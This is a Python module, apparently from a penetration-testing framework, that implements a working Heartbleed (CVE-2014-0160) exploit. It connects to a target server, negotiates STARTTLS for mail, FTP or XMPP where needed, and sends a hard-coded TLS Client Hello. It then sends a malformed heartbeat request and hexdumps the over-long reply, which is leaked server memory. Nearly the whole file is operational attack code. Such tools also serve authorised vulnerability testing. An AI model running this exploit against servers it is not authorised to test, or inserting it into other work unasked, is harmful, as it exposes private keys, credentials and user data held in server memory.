from core.modules.console import print, hexdump
from core.modules.base import Program
from network.modules import socket
import urllib.parse, select, struct, time


class Heartbleed(Program):
    """Verify and exploit the heartbleed bug ..."""
    references = {"CVE": "CVE-2014-0160"}
    def __init__(self, timeout: int = 8, quiet: bool = True):
        super().__init__()
        self.parser.add_argument("url", type = str, help = "Target URL.")
        socket.add_argument_group(self.parser, False)
    
    def recvall(self, sock: socket.socket, length: int, timeout: int = 8):
        endtime = time.time() + timeout
        rdata = b""
        remain = length
        while remain > 0:
            if endtime - time.time() < 0:
                raise socket.timeout("Reading socket data took too long ...")
            if sock in select.select([sock], [], [], 5)[0]:
                data = sock.recv(remain)
                if not data:
                    raise Exception("No data received ...")
                rdata += data
                remain -= len(data)
        return rdata
    
    def recvmsg(self, sock):
        hdr = self.recvall(sock, 5)
        if hdr is None:
            print("[!] Unexpected EOF receiving record header: Server closed connection!", color = "red")
            return None, None, None
        type, version, ln = struct.unpack(">BHH", hdr)
        payload = self.recvall(sock, ln, 10)
        if payload is None:
            print("[!] Unexpected EOF receiving record payload: Server closed connection!", color = "red")
            return None, None, None
        print(f"... Received message: type = {type}, ver = {version:04x}, length = {len(payload)}", dark=True)
        return type, version, payload
    
    def run(self):
        kwargs = {"family": socket.AF_INET6 if self.arguments.ipv6 else socket.AF_INET,
                  "type": socket.SOCK_DGRAM if self.arguments.udp else socket.SOCK_STREAM,
                  "proto": self.arguments.protocol, "timeout": self.arguments.timeout or 8, "blocking": self.arguments.blocking}
        
        url = urllib.parse.urlsplit(self.arguments.url)
        assert url.scheme in ["https", "smtp", "imap", "pop3", "ftp", "xmpp"], ValueError(f"{url.scheme.upper()} is an unsupported protocol!")
        port = url.port or socket.getservbyname(url.scheme)
        sock = socket.socket(**kwargs)
        print(f"[i] Connecting to {url.hostname}:{port} ...", end = "\r")
        sock.connect((url.hostname, port))
        print(f"[i] Connected to {url.hostname}:{port} ...")
        
        if url.scheme != "https":
            print("[i] Sending STARTTLS Command ...")
            if url.scheme == "xmpp":
                sock.send(b"<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n")
                sock.recv(0x400)
            else:
                sock.recv(0x400)
                if url.scheme == "smtp":
                    sock.send(b"EHLO openssl.client.net\n")
                    sock.recv(0x400)
                sock.send((b"STARTTLS\n" if url.scheme in ["smtp", "imap"] else (b"STLS\n" if url.scheme == "pop3" else b"AUTH TLS\n")))
                sock.recv(0x400)
        print("[i] Sending Client Hello ...")
        sock.send(b'\x16\x03\x02\x00\xdc\x01\x00\x00\xd8\x03\x02SC[\x90\x9d\x9br\x0b\xbc\x0c\xbc+\x92\xa8H\x97\xcf\xbd9\x04\xcc\x16\n\x85\x03\x90\x9fw\x043\xd4\xde\x00\x00f\xc0\x14\xc0\n\xc0"\xc0!\x009\x008\x00\x88\x00\x87\xc0\x0f\xc0\x05\x005\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\r\xc0\x03\x00\n\xc0\x13\xc0\t\xc0\x1f\xc0\x1e\x003\x002\x00\x9a\x00\x99\x00E\x00D\xc0\x0e\xc0\x04\x00/\x00\x96\x00A\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\t\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff\x01\x00\x00I\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x004\x002\x00\x0e\x00\r\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\t\x00\n\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11\x00#\x00\x00\x00\x0f\x00\x01\x01')
        print("[i] Waiting for Server Hello ...")
        
        while True:
            type, version, payload = self.recvmsg(sock)
            if type == None:
                print("[!] Server closed connection without sending Server Hello.", color = "red")
                return False
            if type == 22 and payload[0] == 0x0E:
                break
        
        print("[i] Sending heartbeat request ...")
        sock.send(b"\x18\x03\x02\x00\x03\x01@\x00")
        #sock.send(b"\x18\x03\x02\x00\x03\x01@\x00")
        while True:
            type, version, payload = self.recvmsg(sock)
            if type is None:
                print("[!] No heartbeat response received, server's likely not vulnerable.", color = "red")
                return False
            elif type == 21:
                print("[i] Received alert:")
                hexdump(payload, prefix = "    ")
                print("[!] Server returned error, likely not vulnerable.", color = "red")
                return False
            elif type == 24:
                print("[i] Received heartbeat response:")
                hexdump(payload, prefix = "    ")
                if len(payload) > 3:
                    print("[i] WARNING: server returned more data than it should - server is vulnerable!", color = "yellow")
                else:
                    print("[i] Server processed malformed heartbeat, but did not return any extra data.")
                return True
